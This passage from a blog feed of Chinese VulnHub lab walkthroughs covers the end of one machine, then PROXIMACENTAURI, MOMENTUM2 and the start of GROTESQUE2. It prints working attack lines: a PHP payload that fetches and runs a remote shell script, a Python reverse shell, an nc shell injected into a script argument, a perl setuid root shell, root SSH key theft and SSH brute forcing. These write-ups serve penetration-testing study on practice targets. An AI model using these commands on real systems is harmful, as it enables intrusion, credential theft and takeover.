OUTFILE &#x27;/var/lib/mysql/a.php&#x27;</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-741.png\" width=\"620\" alt=\"Image\">\n<p>写入失败，可能被过滤掉了，找到密码，看能否修改密码进行破解</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-742.png\" width=\"650\" alt=\"Image\">\n<p>用 john 破解密码破解失败（此密码应能破解，破解为 Stella）admin:Stella</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-743.png\" width=\"440\" alt=\"Image\">\n<h3 id=\"phpmyadmin-漏洞提权\"><a class=\"markdownIt-Anchor\" href=\"#phpmyadmin-漏洞提权\">#</a> phpmyadmin 漏洞提权</h3>\n<p>接下来可以看一下这个 phpmyadmin 的版本是多少，如果较低的话是可以直接利用现成的 payload 进行提权的</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-744.png\" width=\"680\" alt=\"Image\">\n<p>通过 searchsploit 搜索 phpmyadmin4.8.1 找到了 RCE 漏洞的 payload</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-745.png\" width=\"700\" alt=\"Image\">\n<p>将 paylaod 复制到一个目录下，查阅后开始利用<br>\n <code>python 50457.py datasafe.votenow.local 80 / votebox casoj3FFASPsbyoRP whoami</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-746.png\" width=\"550\" alt=\"Image\">\n<p>根据代码内容输入命令之后没有报错说明可以正常使用此 payload, 修改代码中的拿到权限后的执行的操作，让其反弹 shell</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-747.png\" width=\"680\" alt=\"Image\">\n<p>但是依然没有反弹 shell 成功，需要进行手动复现</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">在SQL语句上写入执行反弹shell的代码</span></span><br><span class=\"line\">select &#x27;&lt;?php system(&quot;wget 192.168.0.152/shell.sh; chmod +x shell.sh; bash shell.sh&quot;);exit;?&gt;&#x27;</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-748.png\" width=\"550\" alt=\"Image\">\n<p>写入恶意 payload 成功后，拿取到此页面保存的 cookie 的值</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-749.png\" width=\"550\" alt=\"Image\">\n<p>同时需要在 kali 机器上准备好反弹 shell 的代码，等待靶机执行</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-750.png\" width=\"440\" alt=\"Image\">\n<p>访问如下网址，最后的后缀是页面的 cookie 的值，成功拿到网站权限<br>\n <code>http://datasafe.votenow.local/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/session/sess_q6brk6uh6kbpb5t9888v47b3epgcoltl</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-751.png\" width=\"700\" alt=\"Image\">\n<img data-src=\"/N1h1l157/VULNHUB/image-752.png\" width=\"440\" alt=\"Image\">\n<p>-&gt; 成功拿到了 apache 用户的网站权限</p>\n<h3 id=\"恶意tar命令提权\"><a class=\"markdownIt-Anchor\" href=\"#恶意tar命令提权\">#</a> 恶意 tar 命令提权</h3>\n<p>搜索一下有没有相关文件的权限设置错误<br>\n <code>find / -group admin 2&gt;/dev/null | grep -v 'proc\\|home'</code></p>\n<p>发现找到一个 admin 组下的一个命令 tarS</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-753.png\" width=\"520\" alt=\"Image\">\n<p>查看 /etc/passwd 确认我们能提权的账户有哪些  <code>cat /etc/passwd | grep bash</code> <br>\n 发现有 admin 和 root 两个账户都存在 bash<br>\njohn 破解 phpmyadmin 后台时可得到 admin:Stella, <code>su admin</code>  尝试提权</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-754.png\" width=\"370\" alt=\"Image\">\n<p>确认一下 admin 用户下是否有某些可执行文件的特权</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">find</span></span><br><span class=\"line\">find / -group admin 2&gt;/dev/null | grep -v &#x27;proc\\|home&#x27;</span><br><span class=\"line\">/usr/bin/tarS -cvf key.tar /root/.ssh/id_rsa</span><br><span class=\"line\">tar -xvf key.tar</span><br></pre></td></tr></table></figure>\n<p>用此有错误权限的 tarS 命令去压缩并解压 root 账户下的 ssh 私钥</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-755.png\" width=\"570\" alt=\"Image\">\n<p>将私钥文件发送到自己的 kali 机器上，修改权限为 600 ，进行连接需要注意目标机器的 ssh 开放在了 2082 端口<br>\n <code>ssh -p 2082 root@192.168.0.154 -i root/.ssh/id_rsa</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-756.png\" width=\"440\" alt=\"Image\">\n<p>-&gt; 成功拿到了 root 权限</p>\n",
            "tags": [
                "VULNHUB 21-30"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2021/11/01/VULNHUB/131%20PROXIMACENTAURI/",
            "url": "http://www.n1h1l157.live/2021/11/01/VULNHUB/131%20PROXIMACENTAURI/",
            "title": "VULNHUB 31 PROXIMACENTAURI",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvaGFja3N1ZG8tcHJveGltYWNlbnRhdXJpLDcwOS8=\">https://www.vulnhub.com/entry/hacksudo-proximacentauri,709/</span><br>\n 教程链接地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDM0NzYyL2FydGljbGUvZGV0YWlscy8xMTg2NjM1NTE=\">https://blog.csdn.net/qq_45434762/article/details/118663551</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 PROXIMACENTAURI：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<p>1 ）确定靶机 ip 地址<br>\n <code>sudo arp-scan -l</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-786.png\" width=\"550\" alt=\"Image\">\n<p>-&gt; 靶机 ip：192.168.31.5</p>\n<p>2 ）确认靶机 ip 开放的端口信息<br>\n <code>sudo nmap -A -p- 192.168.31.5</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-787.png\" width=\"440\" alt=\"Image\">\n<p>-&gt; 靶机开放端口 80</p>\n<h3 id=\"网站信息收集\"><a class=\"markdownIt-Anchor\" href=\"#网站信息收集\">#</a> 网站信息收集</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNQ==\">http://192.168.31.5</span> 进行信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-788.png\" width=\"620\" alt=\"Image\">\n<p>目录扫描:  <code>gobuster dir -x php,txt,html,zip,rar,bak,php.bak -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.31.5</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-789.png\" width=\"700\" alt=\"Image\">\n<p>找到很多目录，暂时不知道哪个目录比较敏感，需要依次访问</p>\n<p>查看目录: <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNS9kb2NzLw==\">http://192.168.31.5/docs/</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-790.png\" width=\"420\" alt=\"Image\">\n<p>看到一个 php 后缀的文件，点开看看:<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNS9kb2NzL3VwZGF0YS5waHA=\">http://192.168.31.5/docs/updata.php</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-791.png\" width=\"700\" alt=\"Image\">\n<img data-src=\"/N1h1l157/VULNHUB/image-792.png\" width=\"700\" alt=\"Image\">\n<p>查看目录:<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNS9pbWFnZXMv\">http://192.168.31.5/images/</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-793.png\" width=\"380\" alt=\"Image\">\n<p>查看目录:<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNS9sb2dpbi5waHA=\">http://192.168.31.5/login.php</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-794.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 得到一个后台的登陆地址，并且该 web 是有 pluck 4.7.13 写出来的</p>\n<p>查看目录:<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNS9maWxlcy8=\">http://192.168.31.5/files/</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-795.png\" width=\"380\" alt=\"Image\">\n<p>查看目录:<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNS9hZG1pbi5waHA=\">http://192.168.31.5/admin.php</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-796.png\" width=\"520\" alt=\"Image\">\n<p>管理员的后台地址，会自动跳转到 login 界面</p>\n<p>查看目录:<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNS9yb2JvdHMudHh0\">http://192.168.31.5/robots.txt</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-797.png\" width=\"440\" alt=\"Image\">\n<p>查看目录:<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNS9wbGFuZXQv\">http://192.168.31.5/planet/</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-798.png\" width=\"320\" alt=\"Image\">\n<p>查看目录:<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNS9maWxlcy9wbGFuZXQv\">http://192.168.31.5/files/planet/</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-799.png\" width=\"700\" alt=\"Image\">\n<p>查看目录:<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNS9maWxlcy9wbGFuZXQuaHRtbA==\">http://192.168.31.5/files/planet.html</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-800.png\" width=\"400\" alt=\"Image\">\n<p>查看目录:<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNS9yZXF1aXJlbWVudHMucGhw\">http://192.168.31.5/requirements.php</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-801.png\" width=\"520\" alt=\"Image\">\n<p>找不到更多的线索了，根据已有的进行总结，发现只有一个 pluck 4.7.13 的信息，和一个后台的登陆地址可以利用</p>\n<h3 id=\"pluck-漏洞利用\"><a class=\"markdownIt-Anchor\" href=\"#pluck-漏洞利用\">#</a> pluck 漏洞利用</h3>\n<p>用 searchsploit 搜索寻 pluck 对应版本漏洞，发现存在一个授权才能访问的 RCE 漏洞</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-802.png\" width=\"700\" alt=\"Image\">\n<p>确认 payload 的位置，将其复制到自己的目录下</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-803.png\" width=\"620\" alt=\"Image\">\n<img data-src=\"/N1h1l157/VULNHUB/image-804.png\" width=\"620\" alt=\"Image\">\n<p>阅读此 py 文件，根据脚本中的内容，带参数执行脚本</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-805.png\" width=\"220\" alt=\"Image\">\n<p>由于此漏洞只适应于 pluck 的授权 RCE，此处如果不能破解出来其账户和密码，显然无法使用，经尝试并不是弱口令，放弃这个目标，继续信息搜集</p>\n<h3 id=\"dirb-扩大信息面\"><a class=\"markdownIt-Anchor\" href=\"#dirb-扩大信息面\">#</a> dirb 扩大信息面</h3>\n<p>dirb 的优点在于搜集到一级目录后，还会继续尝试二级目录的识别</p>\n<p>用 dirb 收集更多的字目录信息: <code>dirb 192.168.31.5</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-806.png\" width=\"480\" alt=\"Image\">\n<p>依次去打开这些二级目录，发现了一个敏感的地址:<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNS9kYXRhL3RyYXNoLw==\">http://192.168.31.5/data/trash/</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-807.png\" width=\"370\" alt=\"Image\">\n<p>继续向下深入，看三级目录:<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNS9kYXRhL3RyYXNoL2ZpbGVzL3NoZWxsLnBoYXI=\">http://192.168.31.5/data/trash/files/shell.phar</span></p>\n<p>最终在此路径下找到了一个 shell.phar 的文件，此命名就比较敏感</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-808.png\" width=\"350\" alt=\"Image\">\n<p>-&gt; 访问此目录，是一个 webshell，现在拿到了网站权限</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-809.png\" width=\"700\" alt=\"Image\">\n<p>在网站上执行命令有诸多不便，需要将其反弹到终端上</p>\n<p>检测到服务器没有 nc，有一个 python3 ，就用 python3 来反弹 shell<br>\n <code>python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.31.75 &quot;,444 4 ));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);'</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-810.png\" width=\"700\" alt=\"Image\">\n<p>设置 stty 的格式，输出为一个比较美观的终端</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-811.png\" width=\"700\" alt=\"Image\">\n<h3 id=\"端口敲门\"><a class=\"markdownIt-Anchor\" href=\"#端口敲门\">#</a> 端口敲门</h3>\n<p>敲门（knock）指的是我们从自己的客户端设备（pc、笔记本或者手机）向服务器 IP 发送一系列实现约好的暗号，而服务器上需要相应的安装接收暗号的服务 knockd，它在接收到正确的暗号的时候，会临时性的为敲门者开一段时间的门并随后关上（当然也能够配置成一直开着），我们要在这几秒钟里面登录成功并且保持连接，如果不小心断了连接就要重新敲门。</p>\n<p>拿到服务器的权限之后，去看了一些敏感文件，敏感权限之后都没有任何问题，筛选端口的时候发现 knock 命令</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-812.png\" width=\"520\" alt=\"Image\">\n<p>查看 knock 的配置文件</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-813.png\" width=\"520\" alt=\"Image\">\n<p>找到了一个 root 账户的端口敲门的配置问题，依次去敲击 14,29,43 端口可以将防火墙规则调整为开放，依次去敲击 62,40,46 端口可以将防火墙规则调整为关闭，注意有一个两个端口之间的间隔时间不能大于 15 ms</p>\n<p>依次按顺序敲击这三个端口 <code>sudo nmap -p 14,29,43 192.168.31.5</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-814.png\" width=\"400\" alt=\"Image\">\n<p>敲击端口前，是 22 是被过滤的，端口敲门之后并没有立即将端口轰开，反而是等待了一段时间之后才将 22 端口打开，现在 22 已经打开，可以通过 ssh 去连接这台服务器了，但是我们并没有 root 账户的密码，怎么去连接呢。</p>\n<p>先直接去做，看能不能有什么收获 <code>ssh root@192.168.31.5</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-815.png\" width=\"520\" alt=\"Image\">\n<h3 id=\"hydra-爆破-ssh\"><a class=\"markdownIt-Anchor\" href=\"#hydra-爆破-ssh\">#</a> hydra 爆破 ssh</h3>\n<p>看到了一个 github 地址，点开进入</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-816.png\" width=\"520\" alt=\"Image\">\n<p>发现是一系列密码并且提示用 proxima、centauri 进行爆破，将字典加载到本地，准备用 hydra 爆破一波</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-817.png\" width=\"520\" alt=\"Image\">\n<p>查看到服务器上存在的用户</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-818.png\" width=\"520\" alt=\"Image\">\n<p>服务器存在 proxima、centauri 用户，将这两个名字写到 user.txt 中，用 hydra 进行爆破</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-819.png\" width=\"450\" alt=\"Image\">\n<p><code>hydra -L user.txt -P passwd.txt ssh://192.168.31.5 -t 4 -I -vV -o hydra.ssh</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-820.png\" width=\"660\" alt=\"Image\">\n<p>很遗憾，爆破失败，继续往下做，在实际测试中，经常有爆破失败的情况，我们需要从更多的角度去收集服务器的信息，经过检查，发现服务器上存在 mysql 的备份文件</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-821.png\" width=\"560\" alt=\"Image\">\n<p>-&gt; 备份文件中就有用户名和密码，alfauser:passw0rd</p>\n<h3 id=\"数据库信息泄露\"><a class=\"markdownIt-Anchor\" href=\"#数据库信息泄露\">#</a> 数据库信息泄露</h3>\n<p>登陆数据库，查询敏感账户和密码： <code>mysql -u alfauser -p</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-822.png\" width=\"580\" alt=\"Image\">\n<p>连接成功，搜索敏感文件</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-823.png\" width=\"520\" alt=\"Image\">\n<p>一翻搜索后，在数据库中找到了 proxima 账户和其密码，切换账户至 proxima 账户，成功拿到其 shell</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-824.png\" width=\"520\" alt=\"Image\">\n<h3 id=\"cap_setuid-提权\"><a class=\"markdownIt-Anchor\" href=\"#cap_setuid-提权\">#</a> cap_setuid 提权</h3>\n<p>接下来要想办法提权至 root，直接上监控 linpeas 看有什么可疑的文件<br>\n <code>wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-825.png\" width=\"700\" alt=\"Image\">\n<p>运行 linpeas 进行检测</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-826.png\" width=\"560\" alt=\"Image\">\n<p>使用 linpeas 之后监测到一个权限设置错误的命令 perl</p>\n<p>Capabilities 是 linux 的一种访问控制能力，能够更精细化的将操作系统权限（网络，文件等）赋权给应用程序，其中就包括设置 uid 和 gid 的权限。因此具备 cap_setuid 和 cap_setgid 权限的程序可以用来进行权限提升。</p>\n<p>提权利用命令在 gtfobins 上可以找到更多：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8vZ3Rmb2JpbnMvcGVybC8=\">https://gtfobins.github.io/gtfobins/perl/</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-827.png\" width=\"620\" alt=\"Image\">\n<p>看官方介绍，也就是为了细分 root 权限的 capabilities，但是也会因为设置错误导致权限提升</p>\n<p><code>./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec &quot;/bin/sh&quot;;'</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-828.png\" width=\"700\" alt=\"Image\">\n<p>-&gt; 成功拿到 root 权限</p>\n",
            "tags": [
                "VULNHUB 31-40"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2021/11/01/VULNHUB/130%20MOMENTUM2/",
            "url": "http://www.n1h1l157.live/2021/11/01/VULNHUB/130%20MOMENTUM2/",
            "title": "VULNHUB 30 MOMENTUM2",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvbW9tZW50dW0tMiw3MDIv\">https://www.vulnhub.com/entry/momentum-2,702/</span><br>\n 教程链接地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3F3d2VnZ2ZlL2FydGljbGUvZGV0YWlscy8xMTkzMjAwNDU=\">https://blog.csdn.net/qwweggfe/article/details/119320045</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 MOMENTUM2：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<p>1 ）确定靶机 ip 地址<br>\n <code>sudo arp-scan -l</code> <br>\n 这次又换了个场所进行测试，所以识别到的 ip 就比较多了，通过 MAC 地址，可确定虚拟在 win 宿主机上的靶机地址</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-757.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 靶机 ip：192.168.31.17</p>\n<p>2 ）确认靶机 ip 开放的端口信息<br>\n <code>sudo nmap -A -p- 192.168.31.17</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-758.png\" width=\"440\" alt=\"Image\">\n<p>-&gt; 靶机开放端口 22,80</p>\n<h3 id=\"网站信息收集\"><a class=\"markdownIt-Anchor\" href=\"#网站信息收集\">#</a> 网站信息收集</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTc=\">http://192.168.31.17</span> 进行信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-759.png\" width=\"520\" alt=\"Image\">\n<p>点击检查源代码，看能不能有所发现</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-760.png\" width=\"520\" alt=\"Image\">\n<p>没有什么敏感的信息，就去爆破一波目录，还是用 gobuster 工具，指定后缀，指定字典式的暴力破解，也可以用 dirsearch 等工具，前提是找到一个比较好的字典</p>\n<p><code>gobuster dir -x php,txt,html,zip,rar,bak,php.bak -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.31.17</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-761.png\" width=\"700\" alt=\"Image\">\n<p>发现了三个敏感的目录，依次访问这几个目录</p>\n<p>查看目录:<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTcvYWpheC5waHAuYmFr\">http://192.168.31.17/ajax.php.bak</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-762.png\" width=\"620\" alt=\"Image\">\n<h3 id=\"敏感数据泄露\"><a class=\"markdownIt-Anchor\" href=\"#敏感数据泄露\">#</a> 敏感数据泄露</h3>\n<p>直接可以下载的一个备份文件，下载下来查看一下</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-763.png\" width=\"570\" alt=\"Image\">\n<p>发现是一个 php 的备份文件，里边写了一个过滤文件的规则，如果 admin 按照如下设置，并且添加一个大写字母在最后，那么就去判断 post, 中是否有 secure 的字段为 val1d，如果有的话就允许上传 php 文件</p>\n<p>查看目录: <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTcvZGFzaGJvYWQuaHRtbA==\">http://192.168.31.17/dashboad.html</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-764.png\" width=\"520\" alt=\"Image\">\n<p>可以上传文件，直接上传一个 shell.php 文件是被拒绝的</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-765.png\" width=\"520\" alt=\"Image\">\n<p>继续查看第三个敏感网址: <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTcvb3dscy8=\">http://192.168.31.17/owls/</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-766.png\" width=\"360\" alt=\"Image\">\n<p>很有可能是上传文件之后的位置，可在这里进行文件的执行</p>\n<p>接下来的思路就是通过备份文件的提示进行 php 上传文件的绕过，在 dashboard.html 界面进行文件的上传，在再 oswl 页面进行文件的执行</p>\n<h3 id=\"crunch-生成字典\"><a class=\"markdownIt-Anchor\" href=\"#crunch-生成字典\">#</a> crunch 生成字典</h3>\n<p>先通过 crunch 生成一个从 A-Z 的字典<br>\n <code>crunch 1 1 -t , -o pass.txt</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-767.png\" width=\"420\" alt=\"Image\">\n<p>将上传文件的数据包拦截下来，并通过 burp 重发数据</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-768.png\" width=\"580\" alt=\"Image\">\n<h3 id=\"burp-重发数据包\"><a class=\"markdownIt-Anchor\" href=\"#burp-重发数据包\">#</a> burp 重发数据包</h3>\n<p>添加 cookie 字段，与另外一个 post 字段</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-769.png\" width=\"520\" alt=\"Image\">\n<p>将 cookie 字段中的最后一个字母设置为随机大写字母</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-770.png\" width=\"470\" alt=\"Image\">\n<p>加载通过 crunch 生成的字典</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-771.png\" width=\"380\" alt=\"Image\">\n<p>批量发包后发现没有得到有效的上传成功的地址</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-772.png\" width=\"470\" alt=\"Image\">\n<p>Owls 页面也没有新的后门上传成功</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-773.png\" width=\"400\" alt=\"Image\">\n<p>注意这个 post 字段有严格的规范，不能有丝毫的错误，这个字段类型和字段内容中间需要一个空行才可以</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-774.png\" width=\"470\" alt=\"Image\">\n<p>再次重发，在 R 处找到了上传成功的 payload</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-775.png\" width=\"560\" alt=\"Image\">\n<p>并且在 owls 页面接收到了上传成功的后门文件</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-776.png\" width=\"400\" alt=\"Image\">\n<p>执行此后门，在监听端口的地方拿到了反弹的 shell</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-777.png\" width=\"570\" alt=\"Image\">\n<h3 id=\"py脚本提权\"><a class=\"markdownIt-Anchor\" href=\"#py脚本提权\">#</a> py 脚本提权</h3>\n<p>查看是否有除 root 账户以外的有 bash 的用户 <code>cat /etc/passwd | grep bash</code> <br>\n 查看是否有相关的敏感文件泄漏，找到了一个备份的密码文件</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-778.png\" width=\"480\" alt=\"Image\">\n<p>并且 Asterisk 的中文为星号</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-779.png\" width=\"520\" alt=\"Image\">\n<p>通过遗留的密码切换到更高一级的用户 athena 上</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-780.png\" width=\"470\" alt=\"Image\">\n<p>查看相应的权限设置是否正确，发现可以直接调用 root 账户执行这个 py 脚本</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-781.png\" width=\"520\" alt=\"Image\">\n<p>直接利用 root 权限执行此脚本</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-782.png\" width=\"520\" alt=\"Image\">\n<p>并没有什么新发现，阅读此文件，发现可以通过拼接命令执行系统命令</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-783.png\" width=\"470\" alt=\"Image\">\n<p>构造命令 <code>id;nc 192.168.31.58 4445 -e /bin/bash;</code>  执行，将 shell 反弹到 kali 机器上</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-784.png\" width=\"520\" alt=\"Image\">\n<p>Kali 上用来监听此端口，成功拿到了反弹的 shell</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-785.png\" width=\"420\" alt=\"Image\">\n<p>-&gt; 成功拿到了 root 权限</p>\n",
            "tags": [
                "VULNHUB 21-30"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2021/11/01/VULNHUB/134%20GROTESQUE2/",
            "url": "http://www.n1h1l157.live/2021/11/01/VULNHUB/134%20GROTESQUE2/",
            "title": "VULNHUB 34 GROTESQUE2",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvZ3JvdGVzcXVlLTIsNjczLw==\">https://www.vulnhub.com/entry/grotesque-2,673/</span><br>\n 教程链接地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vcGVuZXItc3FwL3AvMTQ4Mjc3NzMuaHRtbA==\">https://www.cnblogs.com/pener-sqp/p/14827773.html</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 GROTESQUE2：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<p>1 ）确定靶机 ip 地址<br>\n <code>sudo arp-scan -l &gt; 1.txt ; cat 1.txt | grep 'a0' ; rm -f 1.txt</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-893.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 靶机 ip：192.168.31.73</p>\n<p>2 ）确认靶机 ip 开放的端口信息<br>\n <code>sudo nmap -p- 192.168.31.73</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-894.png\" width=\"470\" alt=\"Image\">\n<p>-&gt; 靶机开放端口 2 2…600 基本上都开放</p>\n<p>这么多网站都开放的肯定是有问题的，需要打开几个找问题所在</p>\n<h3 id=\"wget-批量下载网站\"><a class=\"markdownIt-Anchor\" href=\"#wget-批量下载网站\">#</a> wget 批量下载网站</h3>\n<p>002 信息收集，wget 批量下载，awk/sort 排序分析</p>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNzM=\">http://192.168.31.73</span> , <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNzM6OTk=\">http://192.168.31.73:99</span> 进行信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-895.png\" width=\"520\" alt=\"Image\">\n<img data-src=\"/N1h1l157/VULNHUB/image-896.png\" width=\"520\" 